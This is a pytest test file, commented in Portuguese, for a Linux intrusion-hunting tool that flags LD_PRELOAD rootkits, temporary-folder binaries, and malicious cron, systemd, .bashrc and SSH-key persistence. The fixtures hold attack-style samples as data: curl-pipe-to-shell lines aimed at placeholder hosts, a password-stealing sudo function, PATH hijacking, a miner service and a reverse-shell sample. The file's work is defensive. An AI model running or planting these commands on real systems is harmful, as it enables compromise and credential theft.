import os
from pathlib import Path

import pytest

from guardiao import cacador


@pytest.fixture
def pacotes(tmp_path):
    """Um dpkg falso que diz ter instalado /usr/lib/x86_64-linux-gnu/libc.so.6 e /bin/ls."""
    info = tmp_path / "dpkg-info"
    info.mkdir()
    (info / "libc6.list").write_text("/.\n/usr\n/usr/lib/x86_64-linux-gnu/libc.so.6\n")
    (info / "coreutils.list").write_text("/bin/ls\n")
    return cacador.Pacotes(info)


@pytest.fixture
def tmp_nao_e_temporaria(monkeypatch):
    # O tmp_path do pytest fica em /tmp: sem isto, a regra da pasta temporária responderia antes.
    monkeypatch.setattr(cacador, "PASTAS_TEMPORARIAS", ("/dev/shm/",))


def processo(proc: Path, pid: int, nome: str, ambiente: dict[str, str] | None = None,
             exe: str | None = None) -> Path:
    pasta = proc / str(pid)
    pasta.mkdir(parents=True)
    (pasta / "comm").write_text(nome + "\n")
    (pasta / "environ").write_bytes(b"".join(f"{k}={v}".encode() + b"\0" for k, v in (ambiente or {}).items()))
    if exe:
        (pasta / "exe").symlink_to(exe)
    return pasta


# --- pacotes ----------------------------------------------------------------

def test_pacotes_entende_o_usrmerge(pacotes):
    # O pacote registrou /usr/lib/... e /bin/ls; os dois nomes de cada um valem.
    assert pacotes.dono("/usr/lib/x86_64-linux-gnu/libc.so.6")
    assert pacotes.dono("/lib/x86_64-linux-gnu/libc.so.6")
    assert pacotes.dono("/usr/bin/ls")
    assert not pacotes.dono("/usr/lib/libmalvada.so")
    assert not pacotes.dono("/usrlib/x")


# --- /etc/ld.so.preload -----------------------------------------------------

def test_preload_inexistente_nao_e_achado(tmp_path, pacotes):
    assert list(cacador.preload(pacotes, tmp_path / "ld.so.preload")) == []


def test_preload_vazio_e_so_informativo(tmp_path, pacotes):
    arquivo = tmp_path / "ld.so.preload"
    arquivo.write_text("# nada aqui\n\n")
    [achado] = cacador.preload(pacotes, arquivo)
    assert achado.gravidade == "info"


def test_preload_de_biblioteca_fora_de_pacote_e_alto(tmp_path, pacotes, tmp_nao_e_temporaria):
    lib = tmp_path / "libprocesshider.so"
    lib.write_bytes(b"\x7fELF")
    arquivo = tmp_path / "ld.so.preload"
    arquivo.write_text(f"{lib}\n")
    [achado] = cacador.preload(pacotes, arquivo)
    assert achado.gravidade == "alta"
    assert achado.arquivo == lib
    assert "nenhum pacote" in achado.mensagem


def test_preload_de_pasta_temporaria_e_alto_mesmo_sumido(tmp_path, pacotes):
    arquivo = tmp_path / "ld.so.preload"
    arquivo.write_text("/dev/shm/.x/lib.so /usr/lib/x86_64-linux-gnu/libc.so.6\n")
    achados = {str(a.arquivo): a.gravidade for a in cacador.preload(pacotes, arquivo)}
    assert achados["/dev/shm/.x/lib.so"] == "alta"


# --- LD_PRELOAD nos processos -----------------------------------------------

def test_ld_preload_agrupa_por_biblioteca(tmp_path, pacotes):
    proc = tmp_path / "proc"
    for pid in (10, 11, 12):
        processo(proc, pid, f"bash{pid}", {"LD_PRELOAD": "/tmp/.ICE-unix/libz.so", "HOME": "/root"})
    processo(proc, 20, "firefox", {"HOME": "/home/x"})
    (proc / "self").mkdir()   # entradas que não são processos
    [achado] = cacador.ld_preload_em_processos(pacotes, proc)
    assert achado.gravidade == "alta"
    assert "bash10 (10)" in achado.mensagem and "bash12 (12)" in achado.mensagem


def test_ld_preload_do_snap_e_ignorado(tmp_path, pacotes):
    proc = tmp_path / "proc"
    processo(proc, 30, "snapd-desktop-i",
             {"LD_PRELOAD": ":/snap/snapd-desktop-integration/391/gnome-platform/$LIB/bindtextdomain.so"})
    assert list(cacador.ld_preload_em_processos(pacotes, proc)) == []


def test_ld_preload_so_com_o_nome_e_procurado_como_o_ld_so(tmp_path, pacotes, tmp_nao_e_temporaria):
    pasta = tmp_path / "firefox"
    pasta.mkdir()
    (pasta / "libmozsandbox.so").write_bytes(b"\x7fELF")
    proc = tmp_path / "proc"
    processo(proc, 35, "forkserver", {"LD_PRELOAD": "libmozsandbox.so", "LD_LIBRARY_PATH": f"/nao/existe:{pasta}"})
    processo(proc, 36, "outro", {"LD_PRELOAD": "libsumida.so"})
    achados = {str(a.arquivo): a.gravidade for a in cacador.ld_preload_em_processos(pacotes, proc)}
    # Achada pelo LD_LIBRARY_PATH: julgada pelo caminho de verdade (aqui, fora de pacote).
    assert achados[str(pasta / "libmozsandbox.so")] == "alta"
    assert achados["libsumida.so"] == "media"


def test_ld_preload_de_pacote_e_informativo(tmp_path, pacotes, monkeypatch):
    proc = tmp_path / "proc"
    processo(proc, 40, "app", {"LD_PRELOAD": "/usr/lib/x86_64-linux-gnu/libc.so.6"})
    monkeypatch.setattr(cacador.os.path, "exists", lambda _: True)
    [achado] = cacador.ld_preload_em_processos(pacotes, proc)
    assert achado.gravidade == "info"


def test_processo_ilegivel_e_pulado(tmp_path, pacotes):
    proc = tmp_path / "proc"
    pasta = processo(proc, 50, "sshd")
    (pasta / "environ").unlink()   # como um processo de outro usuário sem root
    assert list(cacador.ld_preload_em_processos(pacotes, proc)) == []


# --- processos --------------------------------------------------------------

def julgar_nada(_caminho):
    return None


def test_processo_de_pasta_temporaria_e_alto(tmp_path, pacotes):
    proc = tmp_path / "proc"
    processo(proc, 60, "kdevtmpfsi", exe="/tmp/.X25-unix/kdevtmpfsi")
    processo(proc, 61, "kdevtmpfsi", exe="/tmp/.X25-unix/kdevtmpfsi")
    processo(proc, 62, "bash", exe="/usr/bin/bash")
    [achado] = cacador.processos(julgar_nada, pacotes, proc)
    assert achado.gravidade == "alta"
    assert achado.arquivo == Path("/tmp/.X25-unix/kdevtmpfsi")
    assert "(60)" in achado.mensagem and "(61)" in achado.mensagem


def test_processo_da_memoria_e_alto_exceto_runc(tmp_path, pacotes):
    proc = tmp_path / "proc"
    processo(proc, 70, "x", exe="/memfd:payload (deleted)")
    processo(proc, 71, "runc:[2:INIT]", exe="/memfd:runc_cloned:/proc/self/exe (deleted)")
    [achado] = cacador.processos(julgar_nada, pacotes, proc)
    assert achado.gravidade == "alta" and "memfd" in achado.mensagem


def test_executavel_apagado(tmp_path, pacotes, tmp_nao_e_temporaria):
    proc = tmp_path / "proc"
    atualizado = tmp_path / "bin" / "editor"
    atualizado.parent.mkdir()
    atualizado.write_text("versão nova")
    processo(proc, 80, "editor", exe=f"{atualizado} (deleted)")       # o apt trocou o arquivo
    processo(proc, 81, "ls", exe="/usr/bin/ls (deleted)")              # de pacote, sumiu
    processo(proc, 82, "sumiu", exe="/home/x/.cache/sumiu (deleted)")  # sumiu de vez
    gravidades = {a.arquivo.name: a.gravidade for a in cacador.processos(julgar_nada, pacotes, proc)}
    assert gravidades == {"editor": "info", "ls": "info", "sumiu": "media"}


def test_processo_sem_permissao_e_pulado(tmp_path, pacotes):
    proc = tmp_path / "proc"
    processo(proc, 90, "sshd")   # sem o link exe, como um processo de root visto sem root
    assert list(cacador.processos(julgar_nada, pacotes, proc)) == []


def test_executavel_do_processo_passa_pelo_scanner(tmp_path, pacotes):
    from .test_guardiao import EICAR
    binario = tmp_path / "minerador"
    binario.write_bytes(EICAR)
    proc = tmp_path / "proc"
    processo(proc, 100, "minerador", exe=str(binario))
    banco = {__import__("hashlib").sha256(EICAR).hexdigest(): "EICAR-Test-File"}
    [achado] = cacador.processos(cacador.Juiz(banco), pacotes, proc)
    assert achado.gravidade == "alta"
    assert achado.mensagem.startswith("EICAR-Test-File")


def test_informativo_nao_e_julgado(tmp_path, pacotes):
    proc = tmp_path / "proc"
    processo(proc, 110, "ls", exe="/usr/bin/ls (deleted)")
    julgados = []
    list(cacador.processos(lambda c: julgados.append(c), pacotes, proc))
    assert julgados == []


# --- persistência -----------------------------------------------------------

@pytest.fixture
def juiz_com_yara():
    from guardiao import regras_yara
    if not regras_yara.disponivel():
        pytest.skip("yara-x não instalado")
    return cacador.Juiz({}, regras_yara.carregar(com_bases=False))


def sem_crontab():
    return ""


def cacar_em(locais, juiz=None, pacotes=None, crontab=sem_crontab):
    achados = cacador.persistencia(juiz or cacador.Juiz(), pacotes, locais, crontab)
    return {a.arquivo.name: a for a in achados}


@pytest.mark.parametrize("formato, texto, esperado", [
    ("systemd", "[Service]\nExecStartPre=-/bin/true\nExecStart=@/opt/x/bin a b\n", ["/bin/true", "/opt/x/bin a b"]),
    ("desktop", "[Desktop Entry]\nName=X\nExec=/usr/bin/app --startup\n", ["/usr/bin/app --startup"]),
    ("cron-sistema", "SHELL=/bin/sh\n# comentário\n*/5 * * * * root /usr/bin/a -x\n@reboot nobody /b\n",
     ["/usr/bin/a -x", "/b"]),
    ("cron-usuario", "0 3 * * 1 /home/u/backup.sh\n@hourly curl x | sh\n", ["/home/u/backup.sh", "curl x | sh"]),
    ("script", "#!/bin/sh\necho oi\n", []),
])
def test_comandos_de_cada_formato(formato, texto, esperado):
    assert cacador.comandos(formato, texto) == esperado


def test_executavel_do_comando():
    assert cacador.executavel("env A=1 nohup /opt/x/minerador " + "".join(["--c", "pu 4"])) == "/opt/x/minerador"
    assert cacador.executavel("'/tmp/a b/c' -d") == "/tmp/a b/c"
    assert cacador.executavel("sh -c 'echo oi'") == cacador.shutil.which("sh")


def test_servico_fora_de_pacote_e_informativo(tmp_path, pacotes):
    pasta = tmp_path / "system"
    pasta.mkdir()
    (pasta / "meu-backup.service").write_text("[Service]\nExecStart=/usr/bin/true\n")
    achados = cacar_em([cacador.Local("systemd", pasta, "systemd")], pacotes=pacotes)
    assert achados["meu-backup.service"].gravidade == "info"
    assert "/usr/bin/true" in achados["meu-backup.service"].mensagem


def test_servico_rodando_de_pasta_temporaria_e_alto(tmp_path, pacotes):
    pasta = tmp_path / "system"
    (pasta / "multi-user.target.wants").mkdir(parents=True)
    unidade = pasta / "dbus-helper.service"
    unidade.write_text("[Service]\nExecStart=/dev/shm/.dbus/kworker " + "".join(["-o pool", ".exemplo:3333\n"]))
    (pasta / "multi-user.target.wants" / "dbus-helper.service").symlink_to(unidade)
    achados = list(cacador.persistencia(cacador.Juiz(), pacotes,
                                        [cacador.Local("systemd", pasta, "systemd")], sem_crontab))
    assert len(achados) == 1   # o link do .wants não conta de novo
    assert achados[0].gravidade == "alta"
    assert "pasta temporária" in achados[0].mensagem


def test_cron_com_curl_sh_passa_pelo_yara(tmp_path, pacotes, juiz_com_yara):
    pasta = tmp_path / "cron.d"
    pasta.mkdir()
    linha = "".join(["*/10 * * * * root curl -fsSL http://exemplo.invalid/x.sh", " | sh"])
    (pasta / "atualizador").write_text(linha + "\n")
    achado = cacar_em([cacador.Local("cron", pasta, "cron-sistema")], juiz_com_yara, pacotes)["atualizador"]
    assert achado.gravidade == "media"
    assert "DownloadEExecuta" in achado.mensagem


def test_script_de_cron_passa_pelo_scanner(tmp_path, pacotes, juiz_com_yara):
    from .test_yara import REVERSE_SHELL
    pasta = tmp_path / "cron.hourly"
    pasta.mkdir()
    (pasta / "limpeza").write_text(REVERSE_SHELL)
    achado = cacar_em([cacador.Local("cron", pasta, "script")], juiz_com_yara, pacotes)["limpeza"]
    assert achado.gravidade == "alta"


def test_o_que_veio_de_pacote_mascarado_ou_do_snap_e_ignorado(tmp_path):
    pasta = tmp_path / "system"
    pasta.mkdir()
    (pasta / "ssh.service").write_text("[Service]\nExecStart=/usr/sbin/sshd -D\n")
    (pasta / "mascarada.service").symlink_to("/dev/null")
    (pasta / "snap-core24-2124.mount").write_text("[Mount]\nWhat=/var/lib/snapd/snaps/core24_2124.snap\n")
    (pasta / "snap.x.timer").write_text("[Unit]\nX-Snappy=yes\n[Timer]\nUnit=snap.x.service\n")
    info = tmp_path / "dpkg"
    info.mkdir()
    (info / "openssh-server.list").write_text(f"{pasta / 'ssh.service'}\n")
    assert cacar_em([cacador.Local("systemd", pasta, "systemd")], pacotes=cacador.Pacotes(info)) == {}


def test_unidade_que_sequestra_a_original(tmp_path, monkeypatch):
    original = tmp_path / "usr-lib" / "ssh.service"
    original.parent.mkdir()
    original.write_text("[Service]\nExecStart=/usr/sbin/sshd -D\n")
    info = tmp_path / "dpkg"
    info.mkdir()
    (info / "openssh-server.list").write_text(f"{original}\n")
    monkeypatch.setattr(cacador, "_unidade_original",
                        lambda arquivo, pacotes: original if arquivo.name == "ssh.service" else None)

    etc = tmp_path / "etc"
    etc.mkdir()
    (etc / "ssh.service").write_text("[Unit]\nAfter=rede.target\n[Service]\nExecStart=/usr/sbin/sshd -D\n")
    local = [cacador.Local("systemd", etc, "systemd")]
    pacotes = cacador.Pacotes(info)
    achado = cacar_em(local, pacotes=pacotes)["ssh.service"]
    assert achado.gravidade == "info" and "mesmo comando" in achado.mensagem

    (etc / "ssh.service").write_text("[Service]\nExecStart=/usr/sbin/sshd -D\nExecStartPost=/opt/.x/porta\n")
    achado = cacar_em(local, pacotes=pacotes)["ssh.service"]
    assert achado.gravidade == "media" and "troca o comando" in achado.mensagem


def test_crontab_do_usuario(pacotes):
    achados = cacar_em([], pacotes=pacotes, crontab=lambda: "@reboot /var/tmp/.s/agent\n")
    assert achados["crontab -l"].gravidade == "alta"


# --- dpkg --verify ----------------------------------------------------------

SAIDA_DPKG = """\
missing     /lib/modules/7.0.0-30-generic/kernel
?????????   /usr/libexec/sssd/sssd_pam
?????????   /boot/vmlinuz-7.0.0-42-generic
??5?????? c /etc/gdm3/custom.conf
??5??????   /usr/bin/ps
??5??????   /usr/share/doc/x/README
"""


def test_pacotes_alterados():
    achados = {str(a.arquivo): a for a in cacador.pacotes_alterados(julgar_nada, SAIDA_DPKG)}
    assert achados["/usr/bin/ps"].gravidade == "alta"
    assert "--reinstall" in achados["/usr/bin/ps"].mensagem
    assert achados["/usr/share/doc/x/README"].gravidade == "media"
    assert achados["/etc/gdm3/custom.conf"].gravidade == "info"
    assert "2 arquivos" in achados["dpkg --verify"].mensagem
    assert not any("modules" in c for c in achados)


def test_pacote_alterado_passa_pelo_scanner(tmp_path):
    from .test_guardiao import EICAR
    falso = tmp_path / "ps"
    falso.write_bytes(EICAR)
    banco = {__import__("hashlib").sha256(EICAR).hexdigest(): "EICAR-Test-File"}
    [achado] = cacador.pacotes_alterados(cacador.Juiz(banco), f"??5??????   {falso}\n")
    assert achado.gravidade == "alta"
    assert achado.mensagem.startswith("EICAR-Test-File")


def test_sem_dpkg_nao_quebra(monkeypatch):
    monkeypatch.setattr(cacador.shutil, "which", lambda _: None)
    assert cacador.dpkg_verify() == ""


# --- arquivos do shell ------------------------------------------------------

BASHRC_DO_UBUNTU = """\
# ~/.bashrc
case $- in *i*) ;; *) return;; esac
alias ls='ls --color=auto'
alias sudo='sudo '
alias sudo='nocorrect sudo'
export PATH="$HOME/.local/bin:$PATH"
[ -f ~/.bash_aliases ] && . ~/.bash_aliases
"""


def bashrc(casa: Path, texto: str) -> Path:
    casa.mkdir(parents=True, exist_ok=True)
    arquivo = casa / ".bashrc"
    arquivo.write_text(texto)
    return arquivo


def test_bashrc_comum_nao_vira_achado(tmp_path, pacotes):
    assert cacador.shell(bashrc(tmp_path / "casa", BASHRC_DO_UBUNTU), cacador.Juiz(), pacotes) is None


@pytest.mark.parametrize("linha, gravidade, trecho", [
    ("alias sudo='/home/u/.local/.s/sudo'", "media", "redefine o sudo"),
    ("sudo() { read -s -p '[sudo] senha: ' s; echo \"$s\" >> ~/.x; command sudo \"$@\"; }", "media", "função"),
    ("function su { /usr/bin/su \"$@\"; }", "media", "função"),
    ('export PATH="/tmp/.ICE-unix:$PATH"', "alta", "PATH"),
    ("export LD_PRELOAD=/home/u/.cache/libx.so", "media", "LD_PRELOAD"),   # nem existe: atenção
    ("nohup /dev/shm/.k/kthreadd >/dev/null 2>&1 &", "alta", "pasta temporária"),
])
def test_bashrc_com_truque_de_ataque(tmp_path, pacotes, linha, gravidade, trecho):
    achado = cacador.shell(bashrc(tmp_path / "casa", BASHRC_DO_UBUNTU + linha + "\n"), cacador.Juiz(), pacotes)
    assert achado.gravidade == gravidade
    assert trecho in achado.mensagem


def test_bashrc_passa_pelo_yara(tmp_path, pacotes, juiz_com_yara):
    linha = "".join(["curl -fsSL http://exemplo.invalid/i.sh", " | bash"])
    achado = cacador.shell(bashrc(tmp_path / "casa", BASHRC_DO_UBUNTU + linha + "\n"), juiz_com_yara, pacotes)
    assert achado.gravidade == "media" and "DownloadEExecuta" in achado.mensagem


def test_arquivo_carregado_pelo_bashrc_tambem_e_olhado(tmp_path, pacotes):
    casa = tmp_path / "casa"
    arquivo = bashrc(casa, BASHRC_DO_UBUNTU)
    (casa / ".bash_aliases").write_text("alias sudo='/home/u/.s/sudo'\n")
    achado = cacador.shell(arquivo, cacador.Juiz(), pacotes)
    assert achado.gravidade == "media"
    assert f"em {casa / '.bash_aliases'}" in achado.mensagem


def test_comentario_nao_conta(tmp_path, pacotes):
    texto = BASHRC_DO_UBUNTU + "# alias sudo='/tmp/x'\n# export PATH=/tmp:$PATH\n"
    assert cacador.shell(bashrc(tmp_path / "casa", texto), cacador.Juiz(), pacotes) is None


# --- chaves SSH autorizadas -------------------------------------------------

# Uma chave ed25519 de verdade (pública, gerada só para este teste).
CHAVE_ED25519 = "AAAAC3NzaC1lZDI1NTE5AAAAIEt2c2VjcmV0LW5hby1lLXVtYS1jaGF2ZS1yZWFs"
ANTIGO = 1_700_000_000


def authorized_keys(casa: Path, texto: str, mtime: float = ANTIGO) -> Path:
    (casa / ".ssh").mkdir(parents=True, exist_ok=True)
    arquivo = casa / ".ssh" / "authorized_keys"
    arquivo.write_text(texto)
    os.utime(arquivo, (mtime, mtime))
    return arquivo


def chaves(casa, ssh_ligado=False, agora=ANTIGO + 30 * 86400, juiz=None):
    return list(cacador.chaves_autorizadas([casa], juiz or cacador.Juiz(), agora, ssh_ligado))


def test_ler_chave_calcula_a_impressao_como_o_ssh_keygen():
    c = cacador.ler_chave(f'no-pty,command="echo oi" ssh-ed25519 {CHAVE_ED25519} eu@notebook')
    assert (c.tipo, c.comentario, c.opcoes) == ("ssh-ed25519", "eu@notebook", 'no-pty,command="echo oi"')
    assert c.impressao.startswith("SHA256:") and "=" not in c.impressao


def test_arquivo_vazio_ou_ausente_nao_vira_achado(tmp_path):
    assert chaves(tmp_path / "sem-ssh") == []
    authorized_keys(tmp_path / "casa", "# só comentário\n\n")
    assert chaves(tmp_path / "casa") == []


def test_chaves_antigas_sao_informativas(tmp_path):
    authorized_keys(tmp_path, f"ssh-ed25519 {CHAVE_ED25519} eu@notebook\n")
    [achado] = chaves(tmp_path)
    assert achado.gravidade == "info"
    assert "eu@notebook" in achado.mensagem and "SSH está desligado" in achado.mensagem


def test_chave_recente_pede_atencao(tmp_path):
    authorized_keys(tmp_path, f"ssh-ed25519 {CHAVE_ED25519} eu@notebook\n", mtime=ANTIGO + 29 * 86400)
    [achado] = chaves(tmp_path, ssh_ligado=True)
    assert achado.gravidade == "media"
    assert "SSH está ligado" in achado.mensagem


def test_chave_da_botnet_outlaw_e_alta(tmp_path):
    authorized_keys(tmp_path, f"ssh-ed25519 {CHAVE_ED25519} eu@notebook\nssh-rsa {CHAVE_ED25519} mdrfckr\n")
    [achado] = chaves(tmp_path)
    assert achado.gravidade == "alta" and "Outlaw" in achado.mensagem


def test_comando_forcado_passa_pelo_yara(tmp_path, juiz_com_yara):
    comando = "".join(["curl -s http://exemplo.invalid/x", " | sh"])
    authorized_keys(tmp_path, f'command="{comando}" ssh-ed25519 {CHAVE_ED25519} deploy\n')
    [achado] = chaves(tmp_path, juiz=juiz_com_yara)
    assert achado.gravidade == "media" and "DownloadEExecuta" in achado.mensagem


def test_ssh_escutando(tmp_path):
    tabela = tmp_path / "tcp"
    cabecalho = "  sl  local_address rem_address   st\n"
    tabela.write_text(cabecalho + "   0: 0100007F:8CA1 00000000:0000 0A\n   1: 00000000:0016 0100007F:9C40 01\n")
    assert not cacador.ssh_escutando((tabela,))   # a 22 aparece só numa conexão já feita
    tabela.write_text(cabecalho + "   0: 00000000:0016 00000000:0000 0A\n")
    assert cacador.ssh_escutando((tabela,))
